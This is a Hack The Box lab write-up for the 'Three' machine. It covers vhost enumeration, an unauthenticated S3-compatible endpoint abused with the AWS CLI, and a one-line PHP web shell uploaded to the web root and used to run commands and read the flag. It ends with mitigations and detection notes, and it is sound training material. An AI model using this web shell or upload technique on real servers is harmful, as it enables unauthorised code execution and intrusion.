---
machine: Three
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [cloud, s3, web, linux, tier1]
---

# Three — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

A hidden vhost (`s3.thetoppers.htb`) exposes an **S3-compatible** endpoint with no real authentication. Using `aws s3` you list the bucket that serves the site, upload `shell.php` and run it over HTTP: the flag is in `/var/www/flag.txt`.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

```bash
echo "<TARGET_IP>    thetoppers.htb" | sudo tee -a /etc/hosts
```

The site is a static "The Toppers" landing page.

## Enumeration

Virtual host fuzzing:

```bash
ffuf -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 10918
```

Result:

```text
s3    [Status: 404, Size: 29]
```

`s3.thetoppers.htb` answers with an S3-style XML error rather than Apache's 404, so a storage service is behind it.

```bash
curl -s http://s3.thetoppers.htb
```

```xml
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
```

## Foothold

Configure the CLI with dummy credentials (the endpoint does not validate them) and point it at the vhost:

```bash
aws configure set aws_access_key_id temp
aws configure set aws_secret_access_key temp
aws configure set default.region us-east-1

aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

The `thetoppers.htb` bucket holds the site contents (`index.php`, `images/`, `css/`). The bucket is the document root, so an uploaded file is served and executed:

```bash
cat > shell.php <<'PHP'
<?php system($_GET['cmd']); ?>
PHP

aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
curl -s "http://thetoppers.htb/shell.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
curl -s "http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt"
```

## Lateral movement

- One host; the bucket and the web server share the same filesystem.
- `www-data` gives no access to other services.

## Privilege escalation

- Not applicable: `www-data` can read the flag.
- In a real case the next step would be `wp-config.php`, environment variables and instance keys.

## Evidence

- S3 XML response and bucket listing.
- `id` output and the flag redacted.

## Lessons learned

- A 404 with a different body reveals another service on the same port: size filtering in `ffuf` is key.
- Object storage that is writable and served by the web server equals unrestricted file upload.
- CLI credentials can be made up when the endpoint does not enforce IAM: missing authentication **is** the vulnerability.
- In a badly built cloud setup, "uploading an object" can mean "executing code".

## Mitigations and detection

**How to fix it:**

- Real authentication/authorisation on the S3 endpoint (IAM, per-bucket policies).
- Keep the bucket outside the document root; never serve PHP from object storage.
- Disable script execution in upload directories.
- Restrict storage service exposure to the internal network.

**How it would be detected:**

- `PUT`/`POST` requests to buckets from unusual IPs.
- New `.php` files in the document root and executions with `cmd=`.
- Repeated `AccessDenied` followed by successful listings (bucket enumeration).

- CWE-306: Missing Authentication for Critical Function
- CWE-434: Unrestricted Upload of File with Dangerous Type
- OWASP Top 10 2021: A01 Broken Access Control
- MITRE ATT&CK: [T1530](https://attack.mitre.org/techniques/T1530/), [T1505.003](https://attack.mitre.org/techniques/T1505/003/)

## References

- [AWS CLI — s3](https://docs.aws.amazon.com/cli/latest/reference/s3/)
- [HackTricks — S3 buckets](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum)
